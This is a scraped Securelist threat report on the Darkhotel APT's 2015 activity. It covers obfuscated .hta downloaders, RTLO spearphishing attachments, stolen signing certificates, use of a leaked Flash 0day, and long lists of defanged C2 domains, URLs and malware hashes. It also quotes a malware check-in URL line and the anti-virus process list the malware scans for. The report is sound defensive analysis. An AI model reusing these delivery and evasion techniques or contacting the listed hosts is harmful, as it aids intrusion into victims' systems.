{
    "title": "darkhotel_u2019s attacks in 2015 _ securelist",
    "text": "Share post on:\nTHERE IS 1 COMMENT\nDarkhotel APT  attacks dated 2014 and earlier are characterized by the misuse of stolen certificates, the deployment of .hta\nfiles with multiple techniques, and the use of unusual methods like the infiltration of hotel Wi-Fi to place backdoors in\ntargets’ systems. In 2015, many of these techniques and activities remain in use. However, in addition to new variants of\nmalicious .hta, we find new victims, .rar attachments with RTLO spearphishing, and the deployment of a 0day from Hacking\nTeam.\nThe Darkhotel APT continues to spearphish targets around the world, with a wider geographic reach than its previous botnet\nbuildout and hotel Wi-Fi attacks. Some of the targets are diplomatic or have strategic commercial interests.\nThe location of Darkhotel’s targets and victims in 2015:\nNorth Korea\nRussia\nSouth Korea\nJapan\nBangladesh\nThailand\nIndia\nMozambique\nGermany\n2015 Darkhotel .hta and backdoor-related, exploit-related and c2 sites:\nstoryonboard[.]net\ntisone360[.]org\nopenofficev[.]info\nsaytargetworld[.]net\nerror-page[.]net\neonlineworld[.]net\nenewsbank[.]net\nthewordusrapid[.]com\n2015 spearphishing incident attachment name subset:\nschedule(6.1~6).rar -> schedule(6.1~6)_?gpj.scr\nschedule(2.11~16).rar -> schedule(2.11~16)_?gpj.scr\ncongratulation.rar -> congratulation_?gpj.scr\nletter.rar -> letter_?gpj.scr\nConsistent use of obfuscated .hta downloaders\nWhether the infection is achieved through spearphishing, physical access to a system or the Hacking Team Flash 0day, there\nfrequently seems to be a common method for a newly-infected system to communicate with Darkhotel’s c2:\nA lightly obfuscated (double escaped set of javascript variable values) script maintained within an .hta file writes an\nexecutable to disk and executes it.\nIt is interesting that this particular group has for years now deployed backdoor and downloader code in the form of .hta\nfiles. In 2010, we observed it re-purposing articles on North Korea  by the US think-tank, Brookings Institute, in order to\nattack North Korean-related targets with malicious code buried in .hta files . It also emailed links to its malicious .hta files  to\nNorth Korean tourist groups, economists with an interest in North Korea, and more. It’s somewhat strange to see such\nheavy reliance on older Windows-specific technology like HTML applications, introduced by Microsoft in 1999 .\nFrom the recent sendspace[.]servermsys[.]com/downloader.hta:\nAfter execution and escaping a couple of variables, the .hta uses ancient Adodb.stream components in order to write out a\nstring xor’d with 0x3d as an executable file and runs it.\nThis code results in the execution of “internet_explorer_Smart_recovery.exe” 054471f7e168e016c565412227acfe7f, and a\nhidden browser window phoning back to its c2. In this case, it seems that Darkhotel operators are checking as to whether or\nnot the victim’s default browser is Internet Explorer, as all versions of IE return the value “0” and other browsers leave\n“appMinorVersion” undefined. This data collection seems somewhat odd, because .hta files are supported and run by\nmshta.exe on Windows systems only, still delivered with Windows 8. Perhaps it is an artefact from early development of the\ncode. Here is a recent version:\n“hxxp://sendspace[.]servermsys[.]com/readme.php?type=execution&result=created_and_executed&info=” +\nnavigator.appMinorVersion + “\nThe “internet_explorer_Smart_recovery.exe” file is a simple obfuscated downloader. A series of xor 0x28 loops decrypt the\ncontents of a self-deletion batch file, which is then written to disk and executed. Later in the execution, a more complex\nrc4 loop decrypts the download url and other strings and imports.\nWhen finished, this url string decryption and connectback looks like\nhttp://sendspace[.]servermsys[.]com/wnctprx. The file is downloaded (b1f56a54309147b07dda54623fecbb89) to “.tmp” file\nin %temp%, executed, and the downloader exits. This larger file is a backdoor/downloader that includes ssh functionality,\nand drops its keys to disk for ssh interaction. We find older Darkhotel information stealers dropped and run on the system by\nthese downloaders.\nSpearphishing and .rar Attachments with RTLO\nThe Darkhotel APT will relentlessly spearphish specific targets in order to successfully compromise systems. Some targets\nare spearphished repeatedly with much the same social-engineering schemes. For example, the attachment\n“schedule(2.11~16).rar” could be sent on February 10th, with Darkhotel returning to the same targets in late May for a\nsecond attempt with attachment “schedule(6.1~6).rar”.\nIt consistently archives RTLO .scr executable files with in .rar archives, in order to appear to the target as innocuous .jpg\nfiles. These executable files are lite droppers, maintaining these decoy jpeg files, and code to create an lnk downloader.\nWhen the target attempts to open what they think is a jpg image file, the executable code runs and drops a jpg image to\ndisk, then opens it with mspaint.exe in the background. This “congratulations” document is in Korean, revealing a likely\ncharacteristic of the intended target.\nWhile the image is displayed, the code drops an unusual mspaint.lnk shortcut to disk and launches it. The shortcut maintains\na multiline target shell script. This technique is also used by other APTs as persistence mechanisms, as documented by our\nMandiant colleagues . The 64kb lnk file is downloader code:\nWhen this lnk file is executed, it begins an AJAX-based download process for the “unzip.js” file\n(a07124b65a76ee7d721d746fd8047066) on openofficev.info. This is another wscript file implementing AJAX to download\nand execute a relatively large compiled executable:\nThis executable code is saved to %temp%\\csrtsrm.exe and executed there. It is a relatively large executable (~1.2 mb) that\ninjects malicious code and spawns remote threads into legitimate processes.\nStolen certiﬁcates and evasion\nThe group appears to maintain a stockpile of stolen certificates and deploys their downloaders and the backdoors signed\nwith them. Some of the more recent revoked certificates include ones that belong to Xuchang Hongguang Technology Co.\nLtd.\nDarkhotel now tends to hide its code behind layers of encryption. It is likely that it has slowly adapted to attacking better-\ndefended environments and prefers not to burn these stolen digital certificates. In previous attacks it would simply have\ntaken advantage of a long list of weakly implemented, broken certificates.\nNot only are its obfuscation techniques becoming stronger, but its anti-detection technology list is growing. For example,\nthis signed downloader (d896ebfc819741e0a97c651de1d15fec) decrypts a set of anti-malware strings in stages to identify\ndefensive technologies on a newly-infected system, and then opens each process, looking for a matching image name:\nc:\\avast! sandbox\\WINDOWS\\system32\\kernel32.dll – Avast!\navp.exe – Kaspersky Lab\nmcagent.exe;mcuicnt.exe – Intel/Mcafee\nbdagent.exe – BitDefender\nravmon.exe,ravmond.exe – Beijing Rising\n360tray.exe,360sd.exe,360rp.exe,exeMgr.exe – Qihoo 360\nayagent.aye,avguard.;avgntsd.exe – Avira Antivirus\nccsvchst.exe,nis.exe – Symantec Norton\navgui.exe,avgidsagent.exe,avastui.exe,avastsvc.exe – Avast!\nmsseces.exe;msmpeng.exe – Microsoft Security Essentials and Microsoft Anti-Malware Service\nAVK.exe;AVKTray.exe – G-Data\navas.exe – TrustPort AV\ntptray.exe – Toshiba utility\nfsma32.exe;fsorsp.exe – F-Secure\neconser.exe;escanmon.exe – Microworld Technologies eScan\nSrvLoad.exe;PSHost.exe – Panda Software\negui.exe;ekrn.exe – ESET Smart Security\npctsSvc.exe;pctsGui.exe – PC Tools Spyware Doctor\ncasc.exe;UmxEngine.exe – CA Security Center\ncmdagent.exe;cfp.exe – Comodo\nKVSrvXP.exe;KVMonXP.exe – Jiangmin Antivirus\nnsesvc.exe;CClaw.exe – Norman\nV3Svc.exe – Ahnlab\nguardxup. – IKARUS\nFProtTray. – F-Prot\nop_mon – Agnitum Outpost\nvba332ldr.;dwengine. – DrWeb\nEven the identifying information that the backdoor seeks from a system is not decrypted until runtime. Like the\n“information-stealer” component documented in our previous Darkhotel technical report , this component seeks to steal a\nset of data with which to identify the infected system. Much of the information is collected with the same set of calls, i.e.\nkernel32.GetDefaultSystemLangID, kernel32.GetVersion, and kernel32.GetSystemInfo:\nDefault system codepage\nNetwork adapter information\nProcessor architecture\nHostname and IP address\nWindows OS and Service Pack versions\nEssentially, much of this information-stealer code is the same as that observed in previous attacks.\nTisone360.com, Visits, and Hacking Team Flash 0day\nThe tisone360.com site was especially interesting to us. In April 2015, Darkhotel was email-phishing with links to earlier\n(cve-2014) Flash exploits, and then, at the beginning of July, it began to distribute what is reported to be a leaked Hacking\nTeam Flash 0day.\nIt looks like the Darkhotel APT may have been using the leaked HackingTeam Flash 0day to target specific systems. We can\npivot from “tisone360.com” to identify some of this activity. The site was up and active as late as 22 July, 2015. However,\nthis looks to be a small part of its activity. In addition to the icon.swf HT 0day (214709aa7c5e4e8b60759a175737bb2b), it\nlooks as though the “tisone360.com” site was delivering a Flash CVE-2014-0497 exploit in April. We reported the related\nvulnerability  to Adobe in January 2014, when it was being used by the Darkhotel APT.\nRecently, the Darkhotel APT has maintained multiple working directories on this site.\nIt is the ims2 directory that is the most active. It contains a set of backdoors and exploits. The most interesting of these is\nthe reported Hacking Team Flash 0day, icon.swf. In the days following the public mention of this server, the crew slowly\ntightened down open access to /ims2/. Either way, the contents continued to be actively used.\nicon.swf (214709aa7c5e4e8b60759a175737bb2b) -> icon.jpg (42a837c4433ae6bd7490baec8aeb5091)\n-> %temp%\\RealTemp.exe (61cc019c3141281073181c4ef1f4e524)\nAfter icon.jpg is downloaded by the flash exploit, it is decoded with a multi-byte xor key 0xb369195a02. It then downloads\nfurther components.\nIt’s interesting to note that the group appears to be altering the compilation and linker timestamps of its executable code to\ndates in 2013. We see this across multiple samples deployed and observed for the first time in mid-2015, including the\nicon.jpg downloader.\nA log of visits to the site directory records that the directory was set up on July 8th. A handful of visits to a specific url on\nthe server from five systems based in the following locations were recorded on the 8th and 9th. Several of these are likely\nto be Darkhotel APT targets:\nGermany\nSouth Korea\nChina (likely to be research)\nUS\nJapan\nHowever, one of those systems hammered the site on the 9th, visiting almost 12,000 times in 30 minutes. This volume of\ntraffic is likely to represent a noisy scanning research attempt and not someone DoS’ing the site:\nRecorded site visits following the 9th are likely to be unreliable and may be more researchers, responding to the growing\nnotoriety of the site following the public reports on the 9th. Many of these approximately 50 visits come from a subset of\nthe above systems and are repeated multiple times. Visits from the following locations occurred on or after the 10th:\nGermany (likely to be research)\nUkraine (likely to be research)\nAmazon Web Services, multiple locations (likely to be research)\nGooglebot, multiple locations\nUS\nIreland (likely to be research)\nRussia\nBrazil\nChina\nFinland\nCanada\nTaiwan\nFrance (likely to be research)\nCzech Republic\nA consistent attack ﬂow\nThe Darkhotel group tends to stick with what works. For example, for years we saw repeated use of spearphishing targets\ndirectly with .hta files. Now, as with the tisone360.com site above, we have seen repeated use in 2015 of a creative chain of\ndelivery sets.\ndownloader -> hta checkin -> info stealer -> more compiled components.\ndropper -> wsh script -> wsh script -> info stealer -> more compiled components\nspearphish -> dropper -> hta checkin -> downloader -> info stealer\nWhile a chain of delivery that includes obfuscated scripts within .hta files occurred as far back as 2011, the volume appears\nto have picked up in 2014 and now 2015.\nopenofficev[.]info (2015)\noffice-revision[.]com (2014)\nonline.newssupply[.]net (2011)\nHiding infrastructure in plain sight\nThe group is now more vigilant in maintaining its sites, tightening up configuration and response content. Right now, its c2\nresponds with anti-hero images of “Drinky Crow” from the alt Maakies cartoon:\nOther Darkhotel c2s tend to blend in with random sites on the web when incorrect or missing pages are visited. They are\nripping images either from FOTOLIA or articles on artisanal ice cream makers  here:\nTechnical details\nHTA md5:\n021685613fb739dec7303247212c3b09\n1ee3dfce97ab318b416c1ba7463ee405\n2899f4099c76232d6362fd62ab730741\n2dee887b20a06b8e556e878c62e46e13\n6b9e9b2dc97ff0b26a8a61ba95ca8ff6\n852a9411a949add69386a72805c8cb05\nbe59994b5008a0be48934a9c5771dfa5\ne29693ce15acd552f1a0435e2d31d6df\nfa67142728e40a2a4e97ccc6db919f2b\nfef8fda27deb3e950ba1a71968ec7466\nSpearphish attachments md5:\n5c74db6f755555ea99b51e1c68e796f9\nc3ae70b3012cc9b5c9ceb060a251715a\n560d68c31980c26d2adab7406b61c651\nda0717899e3ccc1ba0e8d32774566219\nd965a5b3548047da27b503029440e77f\ndc0de14d9d36d13a6c8a34b2c583e70a\n39562e410bc3fb5a30aca8162b20bdd0 (first seen late 2014, used into 2015)\ne85e0365b6f77cc2e9862f987b152a89 (first seen late 2014, used into 2015)\n2015 large downloader md5:\n5e01b8bc78afc6ecb3376c06cbceb680\n61cc019c3141281073181c4ef1f4e524\n3d2e941ac48ae9d79380ca0f133f4a49\nfc78b15507e920b3ee405f843f48a7b3\nda360e94e60267dce08e6d47fc1fcecc\n33e278c5ba6bf1a545d45e17f7582512\nb1f56a54309147b07dda54623fecbb89\n009d85773d519a9a97129102d8116305\nInfostealers dropped in 2015\n61637a0637fb25c53f396c305efa5dc5\na7e78fd4bf305509c2fc1b3706567acd\nSubhosts and urls:\ntisone360[.]com/img_h/ims2/icon.swf\ntisone360[.]com/img_h/ims2/1.php\ntisone360[.]com/img_h/ims2/icon.jpg\ntisone360[.]com/noname/img/movie.swf\ntisone360[.]com/noname/minky/face.php\ntisone360[.]com/htdoc/ImageView.hta\ntisone360[.]com/htdoc/page1/page.html\ndaily[.]enewsbank[.]net/wmpsrx64\ndaily[.]enewsbank[.]net/newsviewer.hta\nsaytargetworld[.]net/season/nextpage.php\nsendspace[.]servermsys.com/wnctprx\nerror-page[.]net/update/load.php\nphoto[.]storyonboard[.]net/wmpsrx64\nphoto[.]storyonboard[.]net/photoviewer.hta\nphoto[.]storyonboard[.]net/readme.php\nunionnewsreport[.]net/aeroflot_bonus/ticket.php\nwww[.]openofficev[.]info/xopen88/office2\nwww[.]openofficev[.]info/dec98/unzip.js\nwww[.]openofficev[.]info/open99/office32\nwww[.]openofficev[.]info/decod9/unzip.js\nParallel and Previous Research\nCVE-2014-0497 – A 0-day Vulnerability\nHacking Team Flash Zero-Day Tied To Attacks In Korea and Japan… on July 1\nThe Darkhotel APT\nRead more about how you can protect your company against the Darkhotel threat actor here .\nAPT CYBER ESPIONAGE  DIGITAL CERTIFICATES  SPEAR PHISHING  TARGETED ATTACKS  \nVULNERABILITIES AND EXPLOITS\nRelated Posts\nTom Creedon\nPosted on August 14, 2015. 3:56 pm\nThe “Korean language” document is specifically North Korean (DPRK). Folks in South Korea (ROK) do not write in that\nfashion an being signed by 김영남 .\nREPLY\nLEAVE A REPLY\nYour email address will not be published.  Required fields are marked *\nEnter your comment here\nName *\nEmail *\nSave my name, email, and website in this browser for the next time I comment.\n \nSUBMIT\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\n \nIN THE SAME CATEGORY\nChafer used Remexi malware to spy on\nIran-based foreign diplomatic entities\nGreyEnergy’s overlap with Zebrocy\nA Zebrocy Go Downloader\nAPT review of the year\nDarkPulsar FAQ\nTHREATS\n CATEGORIES\n TAGS\n STATISTICS ENCYCLOPEDIA DESCRIPTIONS KSB 2019\nAPT REPORTS\nDarkhotel’s attacks in 2015\nBy GReAT  on August 10, 2015. 12:53 pm\n \nNotify me when new comments are added.\n© 2020 AO Kaspersky Lab.  All Rights Reserved. \nRegistered trademarks and service marks are the property of their respective owners.\nContact us  | Privacy Policy  | License AgreementEmail\n I agree to provide my email address to “AO Kaspersky Lab” to\nreceive information about new posts on the site. I understand\nthat I can withdraw this consent at any time via e-mail by\nclicking the “unsubscribe” link that I find at the bottom of any e-\nmail sent to me for the purposes mentioned above.\nSUBSCRIBE\nMokes and Buerak\ndistributed under the guise\nof security certificates\nOperation AppleJeus Sequel\n OilRig’s Poison Frog – old\nsamples, same trick\nEnglish\nSolutions\n Industries\n Products\n Services\n Resource Center\n Contact Us GDPRCompanyAccount GET IN TOUCHSolutions for: Home Products  Small Business 1-50 employees Medium Business 51-999 employees Enterprise 1000+ employees\n "
}